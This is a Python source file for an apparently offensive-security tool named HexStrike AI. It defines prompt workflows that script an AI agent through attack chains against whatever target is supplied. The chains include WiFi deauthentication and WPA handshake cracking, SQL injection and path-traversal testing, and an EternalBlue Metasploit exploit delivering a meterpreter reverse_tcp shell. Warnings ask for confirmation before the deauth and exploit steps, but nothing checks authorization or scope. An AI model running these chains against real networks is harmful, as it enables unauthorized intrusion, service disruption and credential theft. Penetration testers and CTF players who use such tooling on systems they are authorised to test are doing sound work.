"""
mcp_core/prompts.py

FastMCP 3.x native workflow prompts for HexStrike AI.

Each @mcp.prompt() returns list[Message] — structured user/assistant messages
that guide the LLM through a multi-step workflow. User messages set context
and ask for action; assistant messages show the exact run_security_tool() calls.

Registered in setup_mcp_server_standalone() via register_prompts().

Skills reference:
  nmap-recon, subdomain-enum, web-recon, web-vuln,
  password-cracking, smb-enum, exploitation, cloud-audit
"""

from fastmcp import FastMCP
from fastmcp.prompts.prompt import Message


def register_prompts(mcp: FastMCP) -> None:
    """Register all HexStrike workflow prompts."""

    @mcp.prompt()
    async def bug_bounty_recon(target: str) -> list[Message]:
        """
        Full bug bounty reconnaissance workflow.
        Skills: subdomain-enum + nmap-recon + web-recon + web-vuln

        Args:
            target: Root domain to recon (e.g. 'example.com')
        """
        return [
            Message(
                f"You are running a full bug bounty reconnaissance workflow on target: {target}. "
                "Execute each step in order using run_security_tool()."
            ),
            Message(
                f"STEP 1 — Subdomain enumeration:\n"
                f'run_security_tool(tool_name="subfinder", parameters=\'{{"domain": "{target}", "silent": true}}\')\n'
                f'run_security_tool(tool_name="amass", parameters=\'{{"domain": "{target}", "mode": "enum"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Probe live hosts and fingerprint tech stack:\n"
                f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{target}", "probe": true, "tech_detect": true, "title": true, "status_code": true}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Fast port discovery then service detection:\n"
                f'run_security_tool(tool_name="rustscan", parameters=\'{{"target": "{target}", "ports": "1-65535"}}\')\n'
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "additional_args": "-sV -sC -T4"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 4 — Web content and directory discovery:\n"
                f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "https://{target}"}}\')\n'
                f'run_security_tool(tool_name="katana", parameters=\'{{"url": "https://{target}"}}\')\n'
                f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "https://{target}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 5 — Broad CVE and vulnerability scan:\n"
                f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "https://{target}", "severity": "critical,high"}}\')\n'
                f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "https://{target}"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Compile findings for {target}: subdomains discovered, open ports, "
                "tech stack, vulnerabilities. Prioritise critical/high severity and identify attack surface."
            ),
        ]

    @mcp.prompt()
    async def wifi_attack_chain(interface: str, bssid: str, channel: str = "6") -> list[Message]:
        """
        Full WiFi WPA/WPA2 handshake capture and crack chain.
        Skills: wifi_pentest

        Args:
            interface: Wireless interface (e.g. 'wlan0')
            bssid:     Target AP MAC address (e.g. 'AA:BB:CC:DD:EE:FF')
            channel:   Target AP channel (default '6')
        """
        return [
            Message(
                f"You are running a WiFi WPA/WPA2 attack chain — "
                f"interface: {interface} | BSSID: {bssid} | channel: {channel}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — Enable monitor mode:\n"
                f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}", "action": "start"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Start targeted capture:\n"
                f'run_security_tool(tool_name="airodump_ng", parameters=\'{{"interface": "{interface}mon", "bssid": "{bssid}", "channel": "{channel}", "output_prefix": "/tmp/hexstrike_capture"}}\')',
                role="assistant",
            ),
            Message(
                "⚠️ STEP 3 requires user confirmation — deauth attack will disconnect all clients. "
                "Confirm before proceeding."
            ),
            Message(
                f"STEP 3 — Force client deauthentication to capture handshake:\n"
                f'run_security_tool(tool_name="aireplay_ng", parameters=\'{{"interface": "{interface}mon", "attack_mode": 0, "bssid": "{bssid}", "count": 10}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 4 — Crack captured handshake:\n"
                f'run_security_tool(tool_name="aircrack_ng", parameters=\'{{"capture_files": ["/tmp/hexstrike_capture-01.cap"], "wordlist": "/usr/share/wordlists/rockyou.txt", "bssid": "{bssid}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 5 — Restore managed mode:\n"
                f'run_security_tool(tool_name="airmon_ng", parameters=\'{{"interface": "{interface}mon", "action": "stop"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Report: handshake capture status, cracking result for BSSID {bssid}. "
                "If KEY NOT FOUND, suggest hashcat GPU cracking with rules."
            ),
        ]

    @mcp.prompt()
    async def ctf_web_challenge(url: str) -> list[Message]:
        """
        CTF web challenge enumeration and exploitation workflow.
        Skills: web-recon + web-vuln

        Args:
            url: Challenge URL (e.g. 'http://challenge.ctf.local:8080')
        """
        return [
            Message(
                f"You are solving a CTF web challenge at: {url}. "
                "Execute each step in order using run_security_tool()."
            ),
            Message(
                f"STEP 1 — Fingerprint tech stack and check for WAF:\n"
                f'run_security_tool(tool_name="wafw00f", parameters=\'{{"url": "{url}"}}\')\n'
                f'run_security_tool(tool_name="httpx", parameters=\'{{"target": "{url}", "probe": true, "tech_detect": true, "title": true}}\')\n'
                f'run_security_tool(tool_name="nikto", parameters=\'{{"target": "{url}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Directory and file discovery:\n"
                f'run_security_tool(tool_name="gobuster", parameters=\'{{"url": "{url}", "mode": "dir", "wordlist": "/usr/share/wordlists/dirb/common.txt", "additional_args": "-x php,html,txt,bak,old,zip"}}\')\n'
                f'run_security_tool(tool_name="ffuf", parameters=\'{{"url": "{url}/FUZZ", "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "match_codes": "200,204,301,302,307,401,403"}}\')\n'
                f'run_security_tool(tool_name="katana", parameters=\'{{"url": "{url}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Vulnerability scan and injection testing:\n"
                f'run_security_tool(tool_name="nuclei", parameters=\'{{"target": "{url}"}}\')\n'
                f'run_security_tool(tool_name="sqlmap", parameters=\'{{"url": "{url}", "additional_args": "--batch --level=3 --risk=2 --dbs"}}\')\n'
                f'run_security_tool(tool_name="dalfox", parameters=\'{{"url": "{url}"}}\')\n'
                f'run_security_tool(tool_name="dotdotpwn", parameters=\'{{"target": "{url}", "additional_args": "-m http -o unix"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Compile CTF findings for {url}: flags found, vulnerabilities confirmed, "
                "exploitation path. Check /etc/passwd, /flag, /flag.txt."
            ),
        ]

    @mcp.prompt()
    async def smb_lateral_movement(target: str) -> list[Message]:
        """
        SMB enumeration and lateral movement workflow.
        Skills: smb-enum + exploitation

        Args:
            target: Target IP or CIDR range (e.g. '10.10.10.10' or '192.168.1.0/24')
        """
        return [
            Message(
                f"You are running an SMB enumeration and lateral movement workflow on target: {target}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — NetBIOS discovery and SMB version check:\n"
                f'run_security_tool(tool_name="nbtscan", parameters=\'{{"target": "{target}"}}\')\n'
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445,139", "additional_args": "-sV -sC --script smb-vuln-*,smb-security-mode,smb2-security-mode"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Null session enumeration:\n"
                f'run_security_tool(tool_name="enum4linux", parameters=\'{{"target": "{target}", "additional_args": "-a"}}\')\n'
                f'run_security_tool(tool_name="smbmap", parameters=\'{{"target": "{target}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Check EternalBlue + credential testing:\n"
                f'run_security_tool(tool_name="nmap", parameters=\'{{"target": "{target}", "ports": "445", "additional_args": "--script smb-vuln-ms17-010"}}\')\n'
                f'run_security_tool(tool_name="netexec", parameters=\'{{"target": "{target}", "protocol": "smb"}}\')',
                role="assistant",
            ),
            Message(
                "⚠️ STEP 4 requires user confirmation — EternalBlue exploit will run only if MS17-010 is confirmed. Confirm before proceeding."
            ),
            Message(
                f"STEP 4 — Exploit EternalBlue if confirmed:\n"
                f'run_security_tool(tool_name="metasploit", parameters=\'{{"module": "exploit/windows/smb/ms17_010_eternalblue", "options": {{"RHOSTS": "{target}", "PAYLOAD": "windows/x64/meterpreter/reverse_tcp"}}}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Report SMB findings for {target}: shares accessible, users enumerated, "
                "vulnerabilities confirmed, lateral movement paths identified."
            ),
        ]

    @mcp.prompt()
    async def cloud_security_audit(provider: str = "aws", profile: str = "default") -> list[Message]:
        """
        Cloud security audit workflow.
        Skills: cloud-audit

        Args:
            provider: Cloud provider ('aws', 'azure', 'gcp')
            profile:  Cloud credential profile (default 'default')
        """
        return [
            Message(
                f"You are running a cloud security audit — provider: {provider} | profile: {profile}. "
                "Execute each step in order."
            ),
            Message(
                f"STEP 1 — Cloud configuration and compliance audit:\n"
                f'run_security_tool(tool_name="prowler", parameters=\'{{"provider": "{provider}", "profile": "{profile}"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 2 — Container image vulnerability scan:\n"
                f'run_security_tool(tool_name="trivy", parameters=\'{{"target": "nginx:latest", "scan_type": "image", "severity": "HIGH,CRITICAL"}}\')',
                role="assistant",
            ),
            Message(
                f"STEP 3 — Kubernetes cluster assessment:\n"
                f'run_security_tool(tool_name="kube_hunter", parameters=\'{{"additional_args": "--remote <k8s_api_ip>"}}\')',
                role="assistant",
            ),
            Message(
                f"FINAL — Cloud audit report for {provider}: IAM misconfigurations, public resources, "
                "container CVEs, Kubernetes attack surface. Prioritise CRITICAL findings."
            ),
        ]